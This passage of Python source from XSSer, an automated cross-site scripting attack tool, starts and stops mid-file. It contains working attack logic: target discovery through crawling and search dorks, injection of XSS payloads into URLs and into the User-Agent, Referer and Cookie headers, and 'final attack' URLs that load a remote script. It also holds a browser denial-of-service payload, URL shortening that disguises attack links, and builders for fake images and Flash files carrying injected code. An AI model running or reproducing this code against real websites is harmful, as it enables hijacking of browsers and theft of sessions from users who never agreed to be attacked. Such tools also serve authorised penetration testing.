            self.report("[+] Checking: " + method + " attack with " + payload['payload'].strip() + "... ok\n")
        for reporter in self._reporters:
            reporter.add_success(dest_url)
        if self.options.reversecheck:
            if self.options.dcp or self.options.inducedcode or self.options.dom:
                pass
            else:
                self.do_token_check(orig_url, hashing, payload, query_string, dest_url)
        self.hash_found.append((dest_url, payload['browser'], method, hashing, query_string, payload, orig_url))
        if self.options.verbose:
            self.report("Searching hash: " + hashing + " in target source code...\n")
            self.report("This injection is reflected by target, so can be a vulnerability!! :)\n")
            self.report("Try a --reverse-check connection to validate that is 100% vulnerable\n")

    def do_token_check(self, orig_url, hashing, payload, query_string, dest_url):
        self.report("[-] Trying reverse connection from:", orig_url + query_string)
        if "VECTOR" in orig_url:
            dest_url = orig_url
        else:
            if not dest_url.endswith("/"):
                dest_url = dest_url + "/"
            dest_url = orig_url + query_string + payload['payload']

        tok_url = None
        self_url = "http://localhost:19084/success/" + hashing
        shadow_js_inj = "document.location=document.location.hash.substring(1)"
        shadow_inj = "<script>" + shadow_js_inj + "</script>"
        shadow_js_inj = shadow_js_inj
        dest_url = dest_url.split("#")[0]

        def requote(what):
            return urllib.quote_plus(what)
        vector_and_payload = payload['payload']
        _e = self.encoding_permutations
        if 'VECTOR' in dest_url:
            dest_url = dest_url.replace('VECTOR', vector_and_payload)
        if '">PAYLOAD' in dest_url:
            tok_url = dest_url.replace('">PAYLOAD', _e('">' + shadow_inj))
            tok_url += '#' + self_url
        elif "'>PAYLOAD" in dest_url:
            tok_url = dest_url.replace("'>PAYLOAD", _e("'>" + shadow_inj))
            tok_url += '#' + self_url
        elif "javascript:PAYLOAD" in dest_url:
            tok_url = dest_url.replace('javascript:PAYLOAD',
                                       self.encoding_permutations("window.location='" + self_url+"';"))
            tok_url = dest_url.replace("javascript:PAYLOAD",
                                       _e("javascript:" + shadow_js_inj))
            tok_url+= '#' + self_url
        elif '"PAYLOAD"' in dest_url:
            tok_url = dest_url.replace('"PAYLOAD"', '"' + self_url + '"')
        elif "'PAYLOAD'" in dest_url:
            tok_url = dest_url.replace("'PAYLOAD'", "'" + self_url + "'")
        elif 'PAYLOAD' in dest_url and 'SRC' in dest_url:
            tok_url = dest_url.replace('PAYLOAD', self_url)
        elif "SCRIPT" in dest_url:
            tok_url = dest_url.replace('PAYLOAD',
                                      shadow_js_inj)
            tok_url += '#' + self_url
        elif 'onerror="PAYLOAD"' in dest_url:
            tok_url = dest_url.replace('onerror="PAYLOAD"', _e('onerror="' + shadow_inj + '"'))
            tok_url+= '#' + self_url
        elif 'onerror="javascript:PAYLOAD"' in dest_url:
            tok_url = dest_url.replace('javascript:PAYLOAD',
            				self.encoding_permutations("window.location='" + self_url+"';"))
            tok_url = dest_url.replace('onerror="javascript:PAYLOAD"',
                                       _e('onerror="javascript:' + shadow_js_inj + '"'))
            tok_url+= '#' + self_url
        elif '<PAYLOAD>' in dest_url:
            tok_url = dest_url.replace("<PAYLOAD>", _e(shadow_inj))
            tok_url+= '#' + self_url
        elif 'PAYLOAD' in dest_url:
            tok_url = dest_url.replace("PAYLOAD", _e(shadow_inj))
            tok_url+= '#' + self_url
        elif 'href' in dest_url and 'PAYLOAD' in dest_url:
            tok_url = dest_url.replace('PAYLOAD', self_url)
        elif 'HREF' in dest_url and 'PAYLOAD' in dest_url:
            tok_url = dest_url.replace('PAYLOAD', self_url)
        elif 'url' in dest_url and 'PAYLOAD' in dest_url:
            tok_url = dest_url.replace('PAYLOAD', self_url)

        self.final_attacks[hashing] = {'url': tok_url}
        if tok_url:
            self._webbrowser.open(tok_url)
        else:
            print("Cant apply any heuristic for final check on url: " + dest_url)

    def _report_attack_failure(self, curl_handle, dest_url, payload,\
                               attack_vector, orig_url, url_orig_hash):
        """
        report failure of an attack
        """
        options = self.options
        self.hash_notfound.append((dest_url, payload['browser'], "errorcode"))
        self.report("-"*45)
        for reporter in self._reporters:
            reporter.add_failure(dest_url)
        if payload['browser'] == "[hashed_precheck_system]" or payload['browser'] == "[manual_injection]" or payload['browser'] == "[Heuristic test]":
            pass
        else:
            self.report("[-] Hashing: " + url_orig_hash)

        if payload['browser'] == "[Heuristic test]":
            self.report("[+] Trying: " + str(payload['payload']).strip('XSS'))
        else:
            self.report("[+] Trying: " + dest_url.strip())
        self.report("[+] Browser Support: " + payload['browser'])
 
	# statistics injections counters
        if payload['browser']=="[hashed_precheck_system]" or payload['browser']=="[Heuristic test]":
            self.check_positives = self.check_positives + 1
        elif payload['browser']=="[Data Control Protocol Injection]":
            self.dcp_injection = self.dcp_injection + 1
        elif payload['browser']=="[Document Object Model Injection]":
            self.dom_injection = self.dom_injection + 1
        elif payload['browser']=="[Induced Injection]":
            self.httpsr_injection = self.httpsr_injection + 1
        elif payload['browser']=="[manual_injection]":
            self.manual_injection = self.manual_injection + 1
        else:
            self.auto_injection = self.auto_injection +1

        if options.verbose:
            self.report("[-] Headers Results:\n")
            self.report(str(curl_handle.info()))
            self.report("-"*45)

        self.report("[-] Injection Results:")

        if str(curl_handle.info()["http-code"]) == "404":
            self.report("\n404 Not Found: The server has not found anything matching the Request-URI\n")
        elif str(curl_handle.info()["http-code"]) == "403":
            self.report("\n403 Forbidden: The server understood the request, but is refusing to fulfill it\n")
        elif str(curl_handle.info()["http-code"]) == "400":
            self.report("\n400 Bad Request: The request could not be understood by the server due to malformed syntax\n")
        elif str(curl_handle.info()["http-code"]) == "401":
            self.report("\n401 Unauthorized: The request requires user authentication\n\nIf you are trying to authenticate: Login is failing!\n\ncheck:\n- authentication type is correct for the type of realm (basic, digest, gss, ntlm...)\n- credentials 'user:password' are correctly typed\n")
        elif str(curl_handle.info()["http-code"]) == "407":
            self.report("\n407 Proxy Authentication Required: XSSer must first authenticate itself with the proxy\n")
        elif str(curl_handle.info()["http-code"]) == "408":
            self.report("\n408 Request Timeout: XSSer did not produce a request within the time that the server was prepared to wait\n")
        elif str(curl_handle.info()["http-code"]) == "500":
            self.report("\n500 Internal Server Error: The server encountered an unexpected condition which prevented it from fulfilling the request\n")
        elif str(curl_handle.info()["http-code"]) == "501":
            self.report("\n501 Not Implemented: The server does not support the functionality required to fulfill the request\n")
        elif str(curl_handle.info()["http-code"]) == "502":
            self.report("\n502 Bad Gateway: The server received an invalid response from the upstream server.\n")
        elif str(curl_handle.info()["http-code"]) == "503":
            self.report("\n503 Service Unavailable: The server is currently unable to handle the request due to a temporary overloading\n")
        elif str(curl_handle.info()["http-code"]) == "504":
            self.report("\n504 Gateway Timeout: The server did not receive a timely response specified by the URI (try: --ignore-proxy)\n")
        elif str(curl_handle.info()["http-code"]) == "0":
            self.report("\nXSSer is not working propertly with this injection:\n - Is something blocking our connection(s)?\n - Is target url correctly builded?: (" + orig_url + ")\n - Revise that parameters launched are correct\n")
        else:
            self.report("\nNot injected!. Server responses with http-code different to: 200 OK (" + str(curl_handle.info()["http-code"]) + ")")

        if self.options.statistics:
            if str(curl_handle.info()["http-code"]) == "404":
                self.not_connection = self.not_connection + 1
            elif str(curl_handle.info()["http-code"]) == "503":
                self.forwarded_connection = self.forwarded_connection + 1
            else:
                self.other_connection = self.other_connection + 1

    def check_positive(self, curl_handle, dest_url, payload, attack_vector):
        """
        Perform extra check for positives
        """
        body = curl_handle.body()
        # should check ongoing_attacks here
        # perform extra checks
        pass

    def create_options(self, args=None):
        """
        Create the program options for OptionParser.
        """
        self.optionParser = XSSerOptions()
        self.options = self.optionParser.get_options(args)
        if not self.options:
            return False
        return self.options

    def _get_attack_urls(self):
        """
        Process payload options and make up the payload list for the attack.
        """
        urls = []
        options = self.options
        p = self.optionParser
        if options.imx:
            self.create_fake_image(options.imx, options.script)
            #sys.exit()
            return []

        if options.flash:
            self.create_fake_flash(options.flash, options.script)
            #sys.exit()
            return []

        if options.update:
            # XXX implement XSSer autoupdater
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("\nCheck manually for latest 'stable' XSSer version:\n") 
            self.report("- http://sourceforge.net/projects/xsser/files/")
            self.report("\nOr clone sources directly from -svn- repository:\n")
            self.report("$ svn co https://xsser.svn.sourceforge.net/svnroot/xsser xsser\n")
            #sys.exit()
            return []

        if options.url:
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [XSS from URL] injections... looks like your target is good defined ;)")
            self.report('='*75)
            urls = [options.url]

        elif options.readfile:
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [XSS from file] injections... let me see this list ;)")
            self.report('='*75)

            try:
                f = open(options.readfile)
                urls = f.readlines()
                urls = [ line.replace('\n','') for line in urls ]
                f.close()
            except:
                import os.path
                if os.path.exists(options.readfile) == True:
                    self.report('\nThere is some errors opening the file: ', options.readfile, "\n")
                else:
                    self.report('\nThe file: ', options.readfile, " doesn't exist!!\n")

        elif options.dork:
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [XSS from Dork] injections...good luck ;)")
            self.report('='*75)
            dorker = Dorker(options.dork_engine)
            try:
                urls = dorker.dork(options.dork)
            except Exception, e:
                for reporter in self._reporters:
                    reporter.mosquito_crashed(dorker.search_url, str(e.message))
            else:
                for url in urls:
                    for reporter in self._reporters:
                        reporter.add_link(dorker.search_url, url)

        if options.crawling:
            nthreads = options.threads
            self.crawled_urls = list(urls)
            all_crawled = []
            for url in set(urls):
                self.report("Crawling", url, options.crawling,
                            options.crawler_width)
            crawler = Crawler(self, Curl, all_crawled,
                              self.pool)
                            #max(1, int(nthreads/len(urls))))
            crawler.set_reporter(self)

            #if not self._landing:
                #    for reporter in self._reporters:
                    #    reporter.start_crawl(url)
                # add work request
                #self.start_crawl(crawler, url, options)
            # now wait for all results to arrive
            while urls:
                self.run_crawl(crawler, urls.pop(), options)
            while not self._landing:
                for reporter in self._reporters:
                    reporter.report_state('broad scanning')
                try:
                    self.pool.poll()
                except NoResultsPending:
                    # if urls:
                        #    self.run_crawl(crawler, urls.pop(), options)
                        #else:
                    crawler.cancel()
                    break
                if len(self.crawled_urls) >= int(options.crawling) or not crawler._requests:
                    self.report("Founded enough results... calling all mosquitoes home", options.crawling)
                    crawler.cancel()
                    break
                time.sleep(0.1)
            self.report("Mosquitoes founded a total of: " + str(len(self.crawled_urls)) + " urls")
            return self.crawled_urls
     
        if not options.imx or not options.flash or not options.xsser_gtk or not options.update:
            return urls
            
    def run_crawl(self, crawler, url, options):
        def _cb(request, result):
            pass
        #self.crawled_urls += result

        def _error_cb(request, error):
            for reporter in self._reporters:
                reporter.mosquito_crashed(url, str(error[0]))
            traceback.print_tb(error[2])

        def crawler_main(args):
            return crawler.crawl(*args)
        crawler.crawl(url, int(options.crawler_width),
                      int(options.crawling),options.crawler_local)
        """
        self.pool.addRequest(crawler_main, 
                        [[url, int(options.crawler_width), int(options.crawling),
                          options.crawler_local]],
                        _cb,
                        _error_cb)
        """

    def poll_workers(self):
        try:
            self.pool.poll()
        except NoResultsPending:
            pass

    def try_running(self, func, error, args=[]):
        """
        Try running a function and print some error if it fails and exists with
        a fatal error.
        """
        try:
            return func(*args)
        except Exception, e:
            self.report(error, "error")
            #self.report(str(e.message), "")
            if DEBUG:
                traceback.print_exc()
            #sys.exit()

    def create_fake_image(self, filename, payload):
        """
        Create -fake- image with code injected
        """
        options = self.options
        filename = options.imx
        payload = options.script
        image_xss_injections = ImageInjections()
        image_injections = image_xss_injections.image_xss(options.imx , options.script)
        return image_injections

    def create_fake_flash(self, filename, payload):
        """
        Create -fake- flash movie (.swf) with code injected
    	"""
        options = self.options
        filename = options.flash
        payload = options.script
        flash_xss_injections = FlashInjections()
        flash_injections = flash_xss_injections.flash_xss(options.flash, options.script)
        return flash_injections

    def create_gtk_interface(self):
        """
        Create GTK Interface
        """
        options = self.options
        from XSSer.gtkcontroller import Controller, reactor
        uifile = "xsser.ui"
        controller = Controller(uifile, self)
        self._reporters.append(controller)
        if reactor:
            reactor.run()
        else:
            import gtk
            gtk.main()
        return controller

    def run(self, opts=None):
        """
        Run xsser.
        """
        self._landing = False
        for reporter in self._reporters:
            reporter.start_attack()
        if opts:
            options = self.create_options(opts)
            self.set_options(options)

        if not self.mothership and not self.hub:
            self.hub = HubThread(self)
            self.hub.start()

        options = self.options
        # step 0: third party tricks
        if options.imx: # create -fake- image with code injected
            p = self.optionParser
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("[Image XSS auto-builder]...remember, only IE6 and below versions ;)")
            self.report('='*75)
            self.report(''.join(self.create_fake_image(self.options.imx, self.options.script)))
            self.report('='*75 + "\n")

        if options.flash: # create -fake- flash movie (.swf) with code injected
            p = self.optionParser
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("[Flash Attack! XSS auto-builder]...ready to be embedded ;)")
            self.report('='*75)
            self.report(''.join(self.create_fake_flash(self.options.flash, self.options.script)))
            self.report('='*75 + "\n")

        if options.xsser_gtk:
            self.create_gtk_interface()
            return

        nthreads = max(1, abs(options.threads))
        nworkers = len(self.pool.workers)
        if nthreads != nworkers:
            if nthreads < nworkers:
                self.pool.dismissWorkers(nworkers-nthreads)
            else:
                self.pool.createWorkers(nthreads-nworkers)

        for reporter in self._reporters:
            reporter.report_state('scanning')
        
        # step 1: get urls
        urls = self.try_running(self._get_attack_urls, "\nInternal error getting -targets-. look at the end of this Traceback to see whats wrong")
        for reporter in self._reporters:
            reporter.report_state('arming')
        
        # step 2: get payloads
        payloads = self.try_running(self.get_payloads, "\nInternal error getting -payloads-")
        for reporter in self._reporters:
            reporter.report_state('cloaking')
        if options.Dwo:
            payloads = self.process_payloads_ipfuzzing(payloads)
        elif options.Doo:
            payloads = self.process_payloads_ipfuzzing_octal(payloads)

        for reporter in self._reporters:
            reporter.report_state('locking targets')
        
        # step 3: get query string
        query_string = self.try_running(self.get_query_string, "\nInternal error getting query -string-")

        # step 4: print curl options if requested
        if options.verbose:
            Curl.print_options()

        for reporter in self._reporters:
            reporter.report_state('sanitize')
        urls = self.sanitize_urls(urls)

        for reporter in self._reporters:
            reporter.report_state('attack')

        # step 5: perform attack
        self.try_running(self.attack, "\nInternal problems running attack: ", (urls, payloads, query_string))

        for reporter in self._reporters:
            reporter.report_state('reporting')

        if len(self.final_attacks):
            self.report("Waiting for tokens to arrive")
        while self._ongoing_requests and not self._landing:
            if not self.pool:
                self.mothership.poll_workers()
            else:
                self.poll_workers()
            time.sleep(0.2)
            for reporter in self._reporters:
                reporter.report_state('final sweep..')
        print("="*75 + "\n")
        if self.pool:
            self.pool.dismissWorkers(len(self.pool.workers))
            self.pool.joinAllDismissedWorkers()
        start = time.time()
        while not self._landing and len(self.final_attacks) and time.time() - start < 5.0:
            time.sleep(0.2)
            for reporter in self._reporters:
                reporter.report_state('landing.. '+str(int(5.0 - (time.time() - start))))
        if self.final_attacks:
            self.report("Forcing a reverse connection XSSer will certificate that your target is 100% vulnerable\n")
            for final_attack in self.final_attacks.itervalues():
                if not final_attack['url'] == None:
                    self.report("Connecting from:", final_attack['url'] , "\n")
                self.report(",".join(self.successfull_urls) , "is connecting remotely to XSSer... You have it! ;-)", "\n")
                self.report("="*50 + "\n")
        for reporter in self._reporters:
            reporter.end_attack()
        if self.mothership:
            self.mothership.remove_reporter(self)
            print("="*75 + "\n")
            self.report("Mosquito(s) landed!\n")
        else:
            self.report("Mosquito(s) landed!")
        self.print_results()

    def sanitize_urls(self, urls):
        all_urls = set()
        #from urlparse import urlparse
        for url in urls:
            #o = urlparse(url)
            if url.startswith("http://") or url.startswith("https://"):
            # url sanitize info
                #print o
                #print "----------"
                self.urlspoll.append(url)
                all_urls.add(url)
            else:
                self.report("\nThis target: (" + url + ") is not a correct url [DISCARDED]\n")
                url = None
        return all_urls

    def land(self, join=False):
        self._landing = True
        if self.hub:
            self.hub.shutdown()
            if join:
                self.hub.join()
                self.hub = None

    def _prepare_extra_attacks(self):
        """
        Setup extra attacks.
        """
        options = self.options
        if options.xsa:
            hashing = self.generate_hash('xsa')
            Curl.agent = "<script>alert('" + hashing + "')</script>"
            self._ongoing_attacks['xsa'] = hashing
            self.xsa_injection = self.xsa_injection + 1

        if options.xsr:
            hashing = self.generate_hash('xsr')
            Curl.referer = "<script>alert('" + hashing + "')</script>"
            self._ongoing_attacks['xsr'] = hashing
            self.xsr_injection = self.xsr_injection + 1

        if options.coo:
            hashing = self.generate_hash('cookie')
            Curl.cookie = "<script>alert('" + hashing + "')</script>"
            self._ongoing_attacks['cookie'] = hashing
            self.coo_injection = self.coo_injection + 1

    def attack(self, urls, payloads, query_string):
        """
        Perform an attack on the given urls, with the provided payloads and
        query_string.
        """
        for url in urls:
            if self.pool:
                self.poll_workers()
            else:
                self.mothership.poll_workers()
            if not self._landing:
                self.attack_url(url, payloads, query_string)

    def generate_real_attack_url(self, dest_url, description, method, hashing, query_string, payload, orig_url):
        """
        Generate a real attack url, by using data from a successfull test run, but setting
	a real attack payload using or not, special techniques.

	This method also applies DOM stealth mechanisms.
        """
        user_attack_payload = payload['payload']
        if self.options.finalpayload:
            user_attack_payload = self.options.finalpayload
        elif self.options.finalremote:
            user_attack_payload = '<script src="' + self.options.finalremote + '"></script>'
        elif self.options.finalpayload or self.options.finalremote and payload["browser"] == "[Data Control Protocol Injection]":
            user_attack_payload = '<a href="data:text/html;base64,' + b64encode(self.options.finalpayload) + '></a>'
        elif self.options.finalpayload or self.options.finalremote and payload["browser"] == "[Induced Injection]":
            user_attack_payload = self.options.finalpayload
        if self.options.dos:
            user_attack_payload = '<script>for(;;)alert("You was DoSed!!");</script>'
        if self.options.doss:
            user_attack_payload = '<meta%20http-equiv="refresh"%20content="0;">'
        if self.options.b64:
            user_attack_payload = '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4">'
        if self.options.onm:
            user_attack_payload = '"style="position:absolute;top:0;left:0;z-index:1000;width:3000px;height:3000px" onMouseMove="' + user_attack_payload
        if self.options.ifr:
            user_attack_payload = '<iframe src="' + user_attack_payload + '"></iframe>'
		    
        do_anchor_payload = self.options.anchor
        anchor_data = None
        attack_hash = None
        if 'PAYLOAD' in payload['payload']:
            if user_attack_payload == "":
                attack_hash = self.generate_hash('final')
                user_attack_payload = payload['payload']
                user_attack_payload = payload['payload'].replace('PAYLOAD', attack_hash)
            else:
                user_attack_payload = payload['payload'].replace('PAYLOAD', user_attack_payload)
        if 'XSS' in user_attack_payload:
            attack_hash = self.generate_hash('final')
            user_attack_payload = user_attack_payload.replace('XSS', attack_hash)
        if do_anchor_payload:
            dest_url, newhash = self.get_url_payload(orig_url, payload, query_string, user_attack_payload)
            dest_url = dest_url.replace('?', '#')
        else:
            dest_url, newhash = self.get_url_payload(orig_url, payload, query_string, user_attack_payload)
        if attack_hash:
            self.final_attacks[attack_hash] = {'url':dest_url}
        return dest_url

    def token_arrived(self, attack_hash):
        if not self.mothership:
            # only the mothership calls on token arriving.
            self.final_attack_callback(attack_hash)
    def final_attack_callback(self, attack_hash):
        #if not self.mothership:
            #    for reporter in self._reporters:
                #    reporter.token_arrived(attack_hash)
        if attack_hash in self.final_attacks:
            dest_url = self.final_attacks[attack_hash]['url']
            self.report('[*] Browser check:', dest_url)
            for reporter in self._reporters:
                reporter.add_checked(dest_url)
            if self._reporter:
                from twisted.internet import reactor
                reactor.callFromThread(self._reporter.post, 'SUCCESS ' + dest_url)
            self.final_attacks.pop(attack_hash)

    def apply_postprocessing(self, dest_url, description, method, hashing, query_string, payload, orig_url):
        real_attack_url = self.generate_real_attack_url(dest_url, description, method, hashing, query_string, payload, orig_url)
        generate_shorturls = self.options.shorturls
        if generate_shorturls:
            shortener = ShortURLReservations(self.options.shorturls)
            if self.options.finalpayload or self.options.finalremote or self.options.b64 or self.options.dos:
                shorturl = shortener.process_url(real_attack_url)
                self.report("[/] Shortered URL (Final Attack):", shorturl)
            else:
                shorturl = shortener.process_url(dest_url)
                self.report("[/] Shortered URL (Injection):", shorturl)

        return real_attack_url

    def report(self, *args):
        args = list(map(lambda s: str(s), args))
        formatted = " ".join(args)
        if not self.options.silent:
            print(formatted)
        for reporter in self._reporters:
            reporter.post(formatted)

    def print_results(self):
        """
        Print results from an attack.
        """
        self.report('\n' + '='*75)
        total_injections = len(self.hash_found) + len(self.hash_notfound)
        if len(self.hash_found) + len(self.hash_notfound) == 0:
            pass
        else:
            self.report("[*] Final Results:")
            self.report('='*75 + '\n')
            self.report("- Injections:", total_injections)
            self.report("- Failed:", len(self.hash_notfound))
            self.report("- Sucessfull:", len(self.hash_found))
            try:
                _accur = len(self.hash_found) * 100 / total_injections
            except ZeroDivisionError:
                _accur = 0
            self.report("- Accur: %s %%\n" % _accur)
            if not len(self.hash_found) and self.hash_notfound:
                self.report('='*75 + '\n')
                pass
            else:
                self.report('='*75)
                self.report("[*] List of possible XSS injections:")
                self.report('='*75 + '\n')
        #XXX better control of flow
        for line in self.hash_found: 
            attack_url = self.apply_postprocessing(line[0], line[1], line[2], line[3], line[4], line[5], line[6])
            if self.options.fileoutput:
                fout = open("XSSlist.dat", "a")
            if line[2] == "xsr":
                self.xsr_founded = self.xsr_founded + 1
                xsr_vulnerable_host = [{"payload":str(line[4]), "target":str(line[6])}]  
                if xsr_vulnerable_host[0]["payload"] == line[4] and xsr_vulnerable_host[0]["target"] == line[6] and self.xsr_founded > 1:
                    self.xsr_founded = self.xsr_founded - 1
                    pass
                else:
                    self.report("[I] Target:", line[6])
                    self.report("[+] Injection:",str(line[6])+"/"+str(line[4]), "[", Curl.referer, "]")
                    self.report("[!] Special:", "This injection looks like a Cross Site Referer Scripting")
                    self.report("[-] Method:", line[2])
                    self.report('-'*50, "\n")
                    if self.options.fileoutput:
                        fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                        fout.write("---------------------" + "\n")
                        fout.write("[I] Target: " + line[6] + "\n")
                        fout.write("[+] Injection: " + str(line[6])+"/"+str(line[4]) + "[" + Curl.referer + "]" + "\n")
                        fout.write("[!] Special: " + "This injections looks like a Cross Site Referer Scripting" + "\n")
                        fout.write("[-] Method: " + line[2] + "\n" + '-'*50 +"\n")
            elif line[2] == "xsa":
                self.xsa_founded = self.xsa_founded + 1
                xsa_vulnerable_host = [{"payload":str(line[4]), "target":str(line[6])}]
                if xsa_vulnerable_host[0]["payload"] == line[4] and xsa_vulnerable_host[0]["target"] == line[6] and self.xsa_founded > 1:
                    self.xsa_founded = self.xsa_founded - 1
                    pass
                else:
                    self.report("[I] Target:", line[6])
                    self.report("[+] Injection:",str(line[6])+"/"+str(line[4]),
                                "[",  Curl.agent, "]")
                    self.report("[!] Special:", "This injection looks like a Cross Site Agent Scripting")
                    self.report("[-] Method:", line[2])
                    self.report('-'*50, "\n")
                    if self.options.fileoutput:
                        fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                        fout.write("---------------------" + "\n")
                        fout.write("[I] Target: " + line[6] + "\n")
                        fout.write("[+] Injection: "+ str(line[6])+"/"+str(line[4]) + "[" + Curl.agent + "]" + "\n")
                        fout.write("[!] Special: " + "This injection looks like a Cross Site Agent Scripting " + "\n")
                        fout.write("[-] Method: " + line[2] + "\n" + '-'*50 +"\n")
            elif line[2] == "coo":
                self.coo_founded = self.coo_founded + 1
                coo_vulnerable_host = [{"payload":str(line[4]), "target":str(line[6])}]
                if coo_vulnerable_host[0]["payload"] == line[4] and coo_vulnerable_host[0]["target"] == line[6] and self.coo_founded > 1:
                    self.coo_founded = self.coo_founded - 1
                    pass
                else:
                    self.report("[I] Target:", line[6])
                    self.report("[+] Injection:",str(line[6])+"/"+str(line[4]),"[",
                                Curl.cookie, "]")
                    self.report("[!] Special:", "This injection looks like a Cross Site Cookie Scripting")
                    self.report("[-] Method:", line[2])
                    self.report('-'*50, "\n")
                    if self.options.fileoutput:
                        fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                        fout.write("---------------------" + "\n")
                        fout.write("[I] Target: " + line[6] + "\n")
                        fout.write("[+] Injection: "+ str(line[6])+"/"+str(line[4]) + "[" + Curl.cookie + "]" + "\n")
                        fout.write("[!] Special: " + "This injection looks like a Cross Site Cookie Scripting " + "\n")
                        fout.write("[-] Method: " + line[2] + "\n" + '-'*50 +"\n")
            elif line[1] == "[Data Control Protocol Injection]":
                self.dcp_founded = self.dcp_founded + 1
                self.report("[I] Target:", line[6])
                self.report("[+] Injection:", str(line[6])+"/"+str(line[4]),
                            "[", line[5]["payload"] , "]")
                self.report("[!] Special:", "This injection looks like a Data Control Protocol flaw")
                if self.options.finalpayload or self.options.finalremote:
                    self.report("[*] Final Attack: ", attack_url)
                else:
                    self.report("[*] Final Attack: ", line[5]["payload"])
                self.report("[-] Method: dcp")
                self.report('-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n")
                    fout.write("[+] Injection: " + str(line[6]) + "/" + str(line[4]) + "[" + line[5]["payload"] + "]" + "\n")
                    fout.write("[!] Special: " + "This injection looks like a Data Control Protocol flaw" + "\n")
                    if self.options.finalpayload or self.options.finalremote:
                        fout.write("[*] Final Attack: " + attack_url + "\n")
                    else:
                        fout.write("[*] Final Attack: " + line[5]["payload"] + "\n")
                    fout.write("[-] Method: dcp" + "\n" + '-'*50 +"\n")
            elif line[1] == "[Document Object Model Injection]":
                self.dom_founded = self.dom_founded + 1 
                self.report("[I] Target:", line[6])
                self.report("[+] Injection:", str(line[0]))
                self.report("[!] Special:", "This injection looks like a Document Object Model flaw")
                if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                    self.report("[*] Final Attack: ", attack_url)
                else:
                    pass
                self.report("[-] Method: dom")
                self.report('-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n") 
                    fout.write("[+] Injection: " + str(line[0]) + "\n")
                    fout.write("[!] Special: " + "This injection looks like a Document Object Model flaw" + "\n")
                    if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                        fout.write("[*] Final Attack: " + attack_url + "\n")
                    else:
                        pass
                    fout.write("[-] Method: dom" + "\n" + '-'*50 +"\n")

            elif line[1] == "[Induced Injection]":
                self.httpsr_founded = self.httpsr_founded +1
                self.report("[I] Target:", line[6])
                self.report("[+] Injection:", str(line[0]))
                self.report("[!] Special:", "This injection looks like a HTTP Splitting Response")
                if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                    self.report("[*] Final Attack: ", attack_url)
                else:
                    pass
                self.report("[-] Method: ind")
                self.report('-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n")
                    fout.write("[+] Injection: " + str(line[0]) + "\n")
                    fout.write("[!] Special: " + "This injection looks like a HTTP Splitting Response" + "\n")
                    if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                        fout.write("[*] Final Attack: " + attack_url + "\n")
                    else:
                        pass
                    fout.write("[-] Method: ind" + "\n" + '-'*50 +"\n")
            elif line[5]["browser"] == "[hashed_precheck_system]":    
                self.false_positives = self.false_positives + 1
                self.report("[I] Target:", line[6])
                self.report("[+] Injection:", str(line[0]))
                self.report("[!] Checker: This injection looks like a -false positive- result!. Verify it manually!")
                self.report("[-] Method: hash")
                self.report('-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n")
                    fout.write("[+] Injection: " + str(line[0]) + "\n")
                    fout.write("[!] Checker: This injection looks like a -false positive- result!. Verify it manually!" + "\n")
                    fout.write("[-] Method: hash" + "\n" + '-'*50 +"\n")
            elif line[5]["browser"] == "[manual_injection]":
                self.manual_founded = self.manual_founded + 1
                self.report("[I] Target:", line[6])
                self.report("[+] Injection:", str(line[0]))
                self.report("[-] Method: manual")
                self.report('-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n")
                    fout.write("[+] Injection: " + str(line[0]) + "\n")
                    fout.write("[-] Method: manual" + "\n" + '-'*50 +"\n")
            elif line[5]["browser"] == "[Heuristic test]":
                if str(line[5]["payload"]).strip('XSS') == "\\" or str(line[5]["payload"]).strip('XSS') == "/" or str(line[5]["payload"]).strip('XSS') == ">" or str(line[5]["payload"]).strip('XSS') == "<" or str(line[5]["payload"]).strip('XSS') == ";" or str(line[5]["payload"]).strip('XSS') == "'" or str(line[5]["payload"]).strip('XSS') == '"' or str(line[5]["payload"]).strip('XSS') == "=":
                    self.report("[I] Target:", line[6])
                    self.report("[+] Parameter(s):", "[",
                                str(line[5]["payload"]).strip('XSS') , "]")
                    self.report("[!] Special:", "This parameter(s) looks like is NOT -completly- FILTERED on target code")
                    self.report("[-] Method: heuristic")
                    self.report('-'*50, "\n")
                    if self.options.fileoutput:
                        fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                        fout.write("---------------------" + "\n")
                        fout.write("[I] Target: " + line[6] + "\n")
                        fout.write("[+] Parameter(s): " + "[" + str(line[5]["payload"]).strip('XSS') + "]" + "\n")
                        fout.write("[!] Special: " + "This parameter(s) looks like is NOT -completly- FILTERED on target code" + "\n")
